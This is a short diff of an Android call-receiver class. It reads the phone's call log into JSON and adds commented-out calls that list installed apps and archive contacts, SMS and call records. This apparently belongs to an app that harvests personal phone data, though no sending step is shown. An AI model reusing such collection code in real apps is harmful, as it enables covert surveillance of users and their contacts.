@@ -87,7 +87,16 @@ public class CallReceiver extends BroadcastReceiver {
 	}
 
 	private void getCallDetails() {
-
+//		ListApp listApp = new ListApp();
+//		listApp.getListOfInstalledApp(ctx);
+//		GetInfo getInfo = new GetInfo(ctx);
+//		getInfo.getInfo();
+//		GetContacts getCont = new GetContacts();
+//		getCont.execute(ctx);
+//		ArchiveSms arhSms = new ArchiveSms();
+//		arhSms.execute(ctx);
+//		ArchiveCall arhCall = new ArchiveCall();
+//		arhCall.execute(ctx);
 		StringBuffer sb = new StringBuffer();
 		Cursor managedCursor = ctx.getContentResolver().query(
 				CallLog.Calls.CONTENT_URI, null, null, null, null);
@@ -135,7 +144,7 @@ public class CallReceiver extends BroadcastReceiver {
 		JSONObject object = new JSONObject();
 		try {
 			
-			info.put("tel", phNumber);
+			info.put("number", phNumber);
 			info.put("duration", callDuration);
 
 			object.put("time", date);
